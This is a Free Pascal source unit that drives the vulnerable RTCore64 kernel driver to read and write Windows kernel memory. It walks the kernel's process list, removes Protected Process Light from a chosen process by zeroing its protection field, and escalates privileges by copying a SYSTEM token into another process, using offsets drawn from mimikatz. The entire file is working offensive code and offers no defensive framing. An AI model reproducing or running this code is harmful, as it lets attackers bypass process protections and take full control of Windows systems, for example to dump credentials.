unit urtcore_utils;

{$mode delphi}

interface

uses
  windows,SysUtils,urtcore,udrv,uutils;

function listprocess():boolean;
function StealToken(source,destination:dword64):boolean;
function RemovePPL(pid:dword64):boolean;
//function getEProcess(pid:dword64):dword64;
//function getKernelBaseAddr:nativeuint;

implementation

function EnumDeviceDrivers (lpImageBase: PPointer; cb: DWORD;  var lpcbNeeded: DWORD): BOOL stdcall; external 'psapi.dll';


function getKernelBaseAddr:nativeuint;
var
     out_ :dword= 0;
     nb :DWORD= 0;
     base :array of nativeuint;
     base2 :array[0..4096-1] of pointer;
begin
result:=0;
if EnumDeviceDrivers(@base2[0], sizeof(base2), out_)
    then result:=nativeuint(pointer(base2[0]));
exit;
{
    if EnumDeviceDrivers(nil, 0, nb) then
    begin
        setlength(base,nb);
        writeln(nb);
        if EnumDeviceDrivers(@base[0], nb, out_)
            then result:=nativeuint(pointer(base[0]))
            else result:= 0;
    end else result:= 0;
}
end;

function getEProcess(pid:dword64):dword64;
var
          device:thandle=thandle(-1);
          NtoskrnlBaseAddress:nativeuint ;
          Ntoskrnl:HMODULE;
          PsInitialSystemProcessOffset:DWORD64=0;
          PsInitialSystemProcessAddress:DWORD64=0;
          UniqueProcessId:dword64=0;
          imagefilename:string='';
          SystemProcessFlink:dword64=0;
          //
          value:dword64=0;
          nextFlink:dword64=0;
          EProcessAddr:dword64=0;
begin
result:=0;
//
//open handle
device:=OpenHandle('\\.\RTCore64');
if device=thandle(-1) then begin writeln('handle failed');exit;end;
//get kernel base address
NtoskrnlBaseAddress:=(getKernelBaseAddr);
if NtoskrnlBaseAddress=0 then exit;
WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
// Locating PsInitialSystemProcess address
    Ntoskrnl := LoadLibraryW('ntoskrnl.exe');
    PsInitialSystemProcessOffset := dword64(GetProcAddress(Ntoskrnl, 'PsInitialSystemProcess')) - dword64(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    PsInitialSystemProcessAddress := ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    WriteLn('PsInitialSystemProcessAddress:'+inttohex(PsInitialSystemProcessAddress,sizeof(nativeuint)));
    //lets read some EPROCESS fields...
    UniqueProcessId := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.nextFlink-8);
    imagefilename:=ReadMemory16bytes(Device, PsInitialSystemProcessAddress + offsets.ImageFileName);
    SystemProcessFlink:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.nextFlink);
    //WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);

//in case we want the eprocess for system / pid=4
if UniqueProcessId =pid then
   begin
   result:=PsInitialSystemProcessAddress ;
   closehandle(device);
   exit;
   end;
//
nextFlink:=SystemProcessFlink;  //first LIST_ENTRY
if UniqueProcessId=4 then //safety check
begin
//follow the rabbit : lets look at the next eprocess by following list_entry links
while value<>SystemProcessFlink do
begin
EProcessAddr:=nextFlink-dword64(offsets.nextFlink);
UniqueProcessId:=ReadMemoryDWORD64(Device, EProcessAddr+offsets.nextFlink-8);
if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break; //maybe not?
if UniqueProcessId =pid then begin result:=EProcessAddr ; break;end;
nextFlink:=ReadMemoryDWORD64(Device, nextFlink);
value:=nextFlink;
end;//while
end;//if UniqueProcessId=4 then
//
closehandle(device);
end;

function RemovePPL(pid:dword64):boolean;
var
EProcessAddr:dword64=0;
device:thandle=thandle(-1);
begin
result:=false;
EProcessAddr :=getEProcess (pid);
writeln('EProcessAddr:'+inttohex(EProcessAddr,8));
if EProcessAddr>0 then
   begin
   if offsets.SignatureProtect<>0 then
     begin
     device:=OpenHandle('\\.\RTCore64');
     if device=thandle(-1) then begin writeln('handle failed');exit;end;
     writeln('patching process protection:'+inttostr(pid ));
     if WriteMemoryPrimitive (device,4,EProcessAddr+dword64(offsets.SignatureProtect),0)=false  //disable PPL
                then writeln('WriteMemoryPrimitive failed')
                else result:=true;
     //WriteMemoryPrimitive (device,4,next-offsets.EprocessNext+offsets.SignatureProtect,$00623F3F); //enable PPL
     closehandle(device);
     end;//if offsets.SignatureProtect<>0 then
   end;//if eprocess>0 then
end;

function StealToken(source,destination:dword64):boolean;
var
Source_EProcessAddr:dword64=0;
EProcessAddr:dword64=0;
device:thandle=thandle(-1);
SourceProcessToken:dword64=0;
CurrentProcessFastToken,CurrentProcessTokenReferenceCounter,CurrentProcessToken:dword64;
begin
result:=false;
Source_EProcessAddr :=getEProcess (source);
EProcessAddr :=getEProcess (destination);
writeln('Src. EProcessAddr:'+inttohex(Source_EProcessAddr,8));
writeln('Dest. EProcessAddr:'+inttohex(EProcessAddr,8));
if EProcessAddr>0 then
   begin
   if offsets.token<>0 then
     begin
     device:=OpenHandle('\\.\RTCore64');
     if device=thandle(-1) then begin writeln('handle failed');exit;end;
     writeln('make system');
     //clear low 4 bits of _EX_FAST_REF structure
     //https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/
     SourceProcessToken := ReadMemoryDWORD64(Device, Source_EProcessAddr + offsets.Token) and not 15;
     CurrentProcessFastToken := ReadMemoryDWORD64(Device, EProcessAddr+ offsets.Token);
     CurrentProcessTokenReferenceCounter := CurrentProcessFastToken and 15;
     CurrentProcessToken := CurrentProcessFastToken and not 15;
     WriteMemoryDWORD64(Device, EProcessAddr+ dword64(offsets.Token), CurrentProcessTokenReferenceCounter or SourceProcessToken );
     result:=true;
     closehandle(device);
     end;//if offsets.SignatureProtect<>0 then
   end;//if eprocess>0 then
end;

function listprocess():boolean;
var
device:thandle=thandle(-1);
         b:boolean;
         NtoskrnlBaseAddress:nativeuint ;
         Ntoskrnl:HMODULE;
         PsInitialSystemProcessOffset:DWORD64=0;
         PsInitialSystemProcessAddress:DWORD64=0;
         UniqueProcessId:dword64=0;
         SystemProcessFlink:dword64=0;
         value:dword64=0;
         nextFlink:dword64=0;
         imagefilename:string='';
         protection:dword=0;
         SystemProcessToken:dword64=0;
         EProcessAddr:dword64=0;
         CurrentProcessFastToken,CurrentProcessTokenReferenceCounter,CurrentProcessToken:dword64;
begin
result:=false;
//open handle
device:=OpenHandle('\\.\RTCore64');
if device=thandle(-1) then begin writeln('handle failed');exit;end;
//get kernel base address
NtoskrnlBaseAddress:=(getKernelBaseAddr);
WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
// Locating PsInitialSystemProcess address
    Ntoskrnl := LoadLibraryW('ntoskrnl.exe');
    PsInitialSystemProcessOffset := dword64(GetProcAddress(Ntoskrnl, 'PsInitialSystemProcess')) - dword64(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    PsInitialSystemProcessAddress := ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    WriteLn('PsInitialSystemProcessAddress:'+inttohex(PsInitialSystemProcessAddress,sizeof(nativeuint)));
    //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/index.htm
    //offsets : https://github.com/gentilkiwi/mimikatz/blob/68ac65b426d1b9e1354dd0365676b1ead15022de/mimidrv/kkll_m_process.c#L8
    UniqueProcessId := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.nextFlink-8);
    imagefilename:=ReadMemory16bytes(Device, PsInitialSystemProcessAddress + offsets.ImageFileName);
    WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
    SystemProcessFlink:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.nextFlink);
    //WriteLn('SystemProcessFlink:'+inttohex(SystemProcessFlink,sizeof(nativeuint)));
    writeln('*************************');
    nextFlink:=SystemProcessFlink;  //first LIST_ENTRY
    if UniqueProcessId=4 then //safety check
    begin
    result:=true;
    //follow the rabbit : lets look at the next eprocess by following list_entry links
    writeln('EProcess;UniqueID;ImageFilename');
    while value<>SystemProcessFlink do
    begin
          EProcessAddr:=nextFlink-dword64(offsets.nextFlink);
          UniqueProcessId:=ReadMemoryDWORD64(Device, EProcessAddr+offsets.nextFlink-8);
          imagefilename:=ReadMemory16bytes(Device, EProcessAddr+offsets.ImageFileName);
          protection :=ReadMemoryDword(Device, EProcessAddr+dword64(offsets.SignatureProtect));
          if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break; //maybe not?

          writeln(inttohex(EProcessAddr,sizeof(nativeuint))+';'+inttostr(UniqueProcessId)+';'+imagefilename+';'+inttohex(protection,sizeof(dword)) );
          //writeln(ReadMemoryDword64(Device, EProcessAddr+$640)); //ExitTime if <>0 then terminated
          //writeln('DirectoryTableBase:'+inttohex(ReadMemoryDword64(Device, EProcessAddr+$28),sizeof(dword64)));//DirectoryTableBase $28 aka CR3 - is the root of the Page Tables in physical memory
          //writeln('SectionBaseAddress:'+inttohex(ReadMemoryDword64(Device, EProcessAddr+$3b0),sizeof(dword64)));//SectionBaseAddress $3b0
          //writeln('*************************');

          {
          if UniqueProcessId=targetpid then
             begin
             break;
             end;
          }

          nextFlink:=ReadMemoryDWORD64(Device, nextFlink);
          value:=nextFlink;

    end; //while value<>ActiveProcessLinks do

    end; //if UniqueProcessId=4 then
//
if device<>thandle(-1) then writeln('closehandle:'+BoolToStr(closehandle(device),'OK','NOT OK'));
//writeln(BoolToStr (TerminateProcess (process,0)));
end;

end.

